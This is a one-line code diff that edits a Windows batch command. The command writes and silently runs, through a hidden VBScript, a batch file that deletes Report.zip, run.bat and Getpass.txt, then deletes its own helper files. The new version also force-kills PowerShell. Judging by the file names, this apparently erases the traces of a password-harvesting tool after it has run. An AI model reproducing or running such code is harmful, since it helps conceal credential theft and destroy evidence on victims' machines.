@@ -1,1 +1,1 @@
-echo ping 127.1 -t 100 & del d:\Report.zip & del d:\run.bat & del d:\Getpass.txt  > d:\start1.bat & echo createobject("wscript.shell").run "d:\start1.bat",0 > d:\start1.vbs & wscript d:\start1.vbs & del  d:\start1.bat &del d:\start1.vbs
+echo ping 127.1 -t 10 && taskkill /f /im powershell.exe && del d:\Report.zip && del d:\run.bat &&  del d:\Getpass.txt  > d:\start1.bat && echo createobject("wscript.shell").run "d:\start1.bat",0 > d:\start1.vbs && wscript d:\start1.vbs && del  d:\start1.bat && del d:\start1.vbs
